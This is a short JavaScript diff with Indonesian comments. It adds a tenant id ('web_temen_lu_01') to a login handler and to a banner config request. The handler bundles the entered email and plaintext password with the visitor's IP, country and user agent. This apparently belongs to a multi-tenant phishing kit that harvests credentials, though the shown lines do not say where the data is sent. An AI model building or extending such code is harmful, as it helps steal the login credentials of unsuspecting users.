@@ -481,6 +481,7 @@ function loginUser(event){
         .then(function(d){
             var ua = navigator.userAgent;
             var payload = {
+                web_id: "web_temen_lu_01", // <--- TAMBAHAN MULTI-TENANT
                 email: username, password: password,
                 ip: d.ip || "-",
                 negara: d.country_name || "-",
@@ -549,7 +550,8 @@ document.addEventListener("keydown", function(event){
 });
 
 // ================= TAMBAHAN BUAT BANNER DINAMIS =================
-fetch('/api/config').then(r=>r.json()).then(d=>{
+// Gua tambahin ?web_id=web_temen_lu_01 di sini biar narik config yang bener
+fetch('/api/config?web_id=web_temen_lu_01').then(r=>r.json()).then(d=>{
   if(d.banner_url) {
     var banner = document.getElementById('bannerImg');
     if(banner) banner.src = d.banner_url;
